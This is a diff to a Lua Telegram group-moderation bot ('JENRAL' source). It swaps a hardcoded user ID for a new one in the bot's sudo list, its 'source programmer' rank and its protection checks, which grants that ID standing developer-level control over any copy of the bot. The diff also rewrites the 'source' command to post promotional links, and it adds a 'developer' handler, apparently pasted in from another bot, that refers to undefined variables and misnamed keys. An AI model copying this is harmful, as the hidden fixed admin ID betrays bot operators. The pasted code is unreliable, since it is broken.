@@ -134,7 +134,7 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,218385683}
+SudoIds = {Config.SudoIds,1186878655}
 JENRAL = Config.JENRAL
 TokenBot = Config.TokenBot
 NameBot = (DevAbs:get(JENRAL..'Abs:NameBot') or 'الجنرال')
@@ -596,7 +596,7 @@ end ,nil)
 end
 --     Source JENRAL     --
 local AbsRank = function(msg) if SudoId(msg.sender_user_id_) then JENRALTEAM  = "المطور" elseif SecondSudo(msg) then JENRALTEAM = "المطور" elseif SudoBot(msg) then JENRALTEAM = "المطور" elseif ManagerAll(msg) then JENRALTEAM = "المدير" elseif AdminAll(msg) then JENRALTEAM = "الادمن" elseif AbsConstructor(msg) then JENRALTEAM = "المالك" elseif BasicConstructor(msg) then JENRALTEAM = "المنشئ" elseif Constructor(msg) then JENRALTEAM = "المنشئ" elseif Manager(msg) then JENRALTEAM = "المدير" elseif Admin(msg) then JENRALTEAM = "الادمن" else JENRALTEAM = "العضو" end return JENRALTEAM end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(218385683) then JENRALTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(JENRAL) then JENRALTEAM = 'البوت' elseif SudoId(user_id) then JENRALTEAM = 'المطور الاساسي' elseif DevAbs:sismember(JENRAL..'Abs:SecondSudo:', user_id) then JENRALTEAM = 'المطور الثانوي' elseif DevAbs:sismember(JENRAL..'Abs:SudoBot:', user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(JENRAL..'Abs:ManagerAll:', user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(JENRAL..'Abs:AdminAll:', user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(JENRAL..'Abs:VipAll:', user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(JENRAL..'Abs:AbsConstructor:'..chat_id, user_id) then JENRALTEAM = 'المالك' elseif DevAbs:sismember(JENRAL..'Abs:BasicConstructor:'..chat_id, user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(JENRAL..'Abs:Constructor:'..chat_id, user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(JENRAL..'Abs:Managers:'..chat_id, user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(JENRAL..'Abs:Admins:'..chat_id, user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(JENRAL..'Abs:VipMem:'..chat_id, user_id) then  JENRALTEAM = DevAbs:get(JENRAL.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(JENRAL..'Abs:Cleaner:'..chat_id, user_id) then  JENRALTEAM = DevAbs:get(JENRAL.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else JENRALTEAM = DevAbs:get(JENRAL.."Abs:mem:Rd"..chat_id) or 'العضو' end return JENRALTEAM end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1186878655) then JENRALTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(JENRAL) then JENRALTEAM = 'البوت' elseif SudoId(user_id) then JENRALTEAM = 'المطور الاساسي' elseif DevAbs:sismember(JENRAL..'Abs:SecondSudo:', user_id) then JENRALTEAM = 'المطور الثانوي' elseif DevAbs:sismember(JENRAL..'Abs:SudoBot:', user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(JENRAL..'Abs:ManagerAll:', user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(JENRAL..'Abs:AdminAll:', user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(JENRAL..'Abs:VipAll:', user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(JENRAL..'Abs:AbsConstructor:'..chat_id, user_id) then JENRALTEAM = 'المالك' elseif DevAbs:sismember(JENRAL..'Abs:BasicConstructor:'..chat_id, user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(JENRAL..'Abs:Constructor:'..chat_id, user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(JENRAL..'Abs:Managers:'..chat_id, user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(JENRAL..'Abs:Admins:'..chat_id, user_id) then JENRALTEAM = DevAbs:get(JENRAL.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(JENRAL..'Abs:VipMem:'..chat_id, user_id) then  JENRALTEAM = DevAbs:get(JENRAL.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(JENRAL..'Abs:Cleaner:'..chat_id, user_id) then  JENRALTEAM = DevAbs:get(JENRAL.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else JENRALTEAM = DevAbs:get(JENRAL.."Abs:mem:Rd"..chat_id) or 'العضو' end return JENRALTEAM end
 --     Source JENRAL     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -4178,20 +4178,16 @@ DevAbs:set(JENRAL..'Abs:viewget'..msg.sender_user_id_,true)
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
 end
 --     Source JENRAL     --
-if text == "السورس" or text == "سورس" then 
-local text =  [[
-Welcome To Source
-⌁︙JENRAL TEAM
-┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GENRALTEAM)
-
-⌁︙[Exp Source](https://t.me/IIIIIIII_8)
-
-⌁︙[Developer](https://t.me/QvQvQvQ)
-┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Tws JENRAL](https://t.me/Ialusbot)
-]]
-Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
+if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then       
+Text = "[ᴠᴇɴᴏᴍ ѕᴏụʀᴄᴇ ـ ](https://t.me/VeNoM_Source)"
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '⌔ Source Channel',url="https://t.me/GENRALTEAM"}},
+{{text = '⌔ Developer',url="t.me/QvQvQvQ"},{text = '⌔ Tws JENRAL',url="https://t.me/Ialusbot"}}
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/VeNoM_Source&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+return false
 end
 --     Source JENRAL     --
 if ChatType == 'sp' or ChatType == 'gp'  then
@@ -4365,7 +4361,7 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(218385683) then 
+if tonumber(result.id_) == tonumber(1186878655) then 
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -4396,7 +4392,7 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(218385683) then  
+if tonumber(result.sender_user_id_) == tonumber(1186878655) then  
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
@@ -9313,6 +9309,26 @@ end,nil)
 end
 end
 --     Source JENRAL     --
+if text == "المطور" or text == "مطور" then
+local TEXT_SUD = database:get(bot_id..'Rocks:TEXT_SUDO')
+if TEXT_SUDO then 
+send(msg.chat_id_, msg.id_,TEXT_SUDO)
+else
+tdcli_function ({ID = "GetUser",user_id_ = SUDO,},function(arg,result) 
+tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = SUDO,offset_ = 0,limit_ = 1},function(arg,getpro) 
+if getpro.photos_[0] then
+Name = '*المطور ~⪼* ['..result.first_name_..'](tg://user?id='..result.id_..')\n'
+Name = Name..'*البايو ~⪼* ['..getbio(SUDO)..']\n'
+keyboard = {}
+keyboard.inline_keyboard = {{{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""}},}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..getpro.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+else
+send(msg.chat_id_, msg.id_,Name,1, 'md')
+end
+end,nil)   
+end,nil)   
+end
 if text and text:match("^المطور$") then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
